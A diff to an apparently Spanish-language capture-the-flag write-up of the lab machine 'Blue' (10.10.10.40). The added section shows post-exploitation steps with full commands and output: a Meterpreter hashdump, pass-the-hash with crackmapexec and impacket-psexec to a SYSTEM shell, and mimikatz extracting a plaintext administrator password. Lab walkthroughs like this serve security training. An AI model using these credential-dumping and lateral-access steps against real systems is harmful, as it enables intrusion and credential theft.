@@ -137,7 +137,7 @@
 <section class="post" id="enumeration">
 <br><h3 class="post-title">Enumeración</h3><br>
 
-<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con nmap, aunque realmente no hay muchos puertos abiertos más que smb y rcp</p>
+<p class="plain-text">Iniciamos la máquina escaneando los puertos de la máquina con <code class="language-plaintext highlighter-rouge">nmap</code>, aunque realmente no hay muchos puertos abiertos más que smb y rcp</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ nmap </span><span class="p">10.10.10.40
 Nmap scan report for 10.10.10.40  
@@ -162,7 +162,7 @@ PORT      STATE SERVICE
 <section class="post" id="shell-administrator">
 <br><h3 class="post-title">Shell - NT Authority\System</h3><br>
 
-<p class="plain-text">Tenemos un Windows 7 con SMBv1 y la máquina se llama Blue, podemos probar con un script de nmap si es vulnerable al Eternal Blue</p>
+<p class="plain-text">Tenemos un Windows 7 con <code class="language-plaintext highlighter-rouge">SMBv1</code> y la máquina se llama <code class="language-plaintext highlighter-rouge">Blue</code>, podemos probar con un script de nmap si es vulnerable al <code class="language-plaintext highlighter-rouge">Eternal Blue</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ nmap</span><span class="p"> -p 445 --script smb-vuln-ms17-010 10.10.10.40
 Nmap scan report for 10.10.10.40
@@ -244,9 +244,9 @@ Channel 1 created.
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.  
 
-C:\Windows\system32></span><span class="am">cd </span><span class="p">C:\Users
+C:\Windows\system32></span><span class="am"> cd </span><span class="p">C:\Users
 
-C:\Users></span><span class="am">dir</span><span class="p">
+C:\Users></span><span class="am"> dir</span><span class="p">
 
  Volume in drive C has no label.
  Volume Serial Number is BE92-053B
@@ -262,13 +262,236 @@ C:\Users></span><span class="am">dir</span><span class="p">
                0 File(s)              0 bytes
                5 Dir(s)   2,429,788,160 bytes free
 
-C:\Users></span><span class="am">type </span><span class="p">C:\Users\haris\Desktop\user.txt
+C:\Users></span><span class="am"> type </span><span class="p">C:\Users\haris\Desktop\user.txt
 059**************************681
 
-C:\Users></span><span class="am">type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
+C:\Users></span><span class="am"> type </span><span class="p">C:\Users\Administrator\Desktop\root.txt
 399**************************deb
 
 C:\Users></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos usar la función de meterpreter para dumpear la <code class="language-plaintext highlighter-rouge">sam</code> y ver los hashes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:cdf51b162460b7d5bc898f493751a0cc:::  
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+haris:1000:aad3b435b51404eeaad3b435b51404ee:8002bc89de91f6b52d518bde69202dc6:::
+(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) ></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Comprobamos el hash NT de Administrator con crackmapexec y devuelve <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40 -u Administrator -H cdf51b162460b7d5bc898f493751a0cc
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">haris-PC\Administrator:cdf51b162460b7d5bc898f493751a0cc </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Usando <code class="language-plaintext highlighter-rouge">psexec</code> o wmiexec de impacket podemos conectarnos haciendo un passthehash y obtener una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file zqdeRFGe.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service BawI on 10.10.10.40.....
+[*] Starting service BawI.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Solo como complemento podemos subir el <code class="language-plaintext highlighter-rouge">mimikatz.exe</code> y dumpear las logon passwords esto nos permite ver la <code class="language-plaintext highlighter-rouge">contraseña</code> de Administrator en texto plano</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > upload mimikatz.exe  
+</span><span class="az">[*] </span><span class="p">Uploading  : /home/kali/mimikatz.exe -> mimikatz.exe
+</span><span class="az">[*] </span><span class="p">Completed  : /home/kali/mimikatz.exe -> mimikatz.exe
+</span><span class="p">(</span><span class="ve">Meterpreter </span><span class="az">1</span><span class="p">)(C:\Windows\system32) > shell
+Process 2916 created.
+Channel 5 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </span><span class="am">.\mimikatz.exe </span><span class="az">"sekurlsa::logonPasswords" </span><span class="p">exit
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/  
+
+mimikatz(commandline) # sekurlsa::logonPasswords
+
+Authentication Id : 0 ; 433695 (00000000:00069e1f)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 28/05/2023 19:42:39
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : ejfnIWWDojfWEKM
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 242258 (00000000:0003b252)
+Session           : Interactive from 0
+User Name         : Administrator
+Domain            : haris-PC
+Logon Server      : HARIS-PC
+Logon Time        : 28/05/2023 19:42:31
+SID               : S-1-5-21-319597671-3711062392-2889596693-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * NTLM     : cdf51b162460b7d5bc898f493751a0cc
+	 * SHA1     : dff1521f5f2d7436a632d26f079021e9541aba66
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : ejfnIWWDojfWEKM
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : haris-PC
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : HARIS-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : HARIS-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : haris-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 41719 (00000000:0000a2f7)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : HARIS-PC$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 28/05/2023 19:42:10
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : HARIS-PC$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : haris-pc$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz(commandline) # exit
+Bye!
+
+C:\Windows\system32></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">La validamos a traves de <code class="language-plaintext highlighter-rouge">crackmapexec</code> y es valida, nos devuelve un <code class="language-plaintext highlighter-rouge">Pwn3d!</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ crackmapexec </span><span class="p">smb 10.10.10.40 -u Administrator -p ejfnIWWDojfWEKM
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="az">[*] </span><span class="p">Windows 7 Professional 7601 Service Pack 1 x64 (name:HARIS-PC) (domain:haris-PC) (signing:False) (SMBv1:True)  
+</span><span class="az">SMB         </span><span class="p">10.10.10.40  445    HARIS-PC         </span><span class="ve">[+] </span><span class="p">haris-PC\Administrator:ejfnIWWDojfWEKM </span><span class="am">(Pwn3d!)</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos conectarnos nuevamente con <code class="language-plaintext highlighter-rouge">psexec</code> pero esta vez usando la contraseña</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ impacket-psexec </span><span class="p">WORKGROUP/Administrator:ejfnIWWDojfWEKM@10.10.10.40  
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.40.....
+[*] Found writable share ADMIN$
+[*] Uploading file KGLYVgEQ.exe
+[*] Opening SVCManager on 10.10.10.40.....
+[*] Creating service twrW on 10.10.10.40.....
+[*] Starting service twrW.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> </span><span class="am">whoami</span><span class="p">
+nt authority\system
+
+C:\Windows\system32></span>
 </code></pre></div></div><br>
 
 </section>
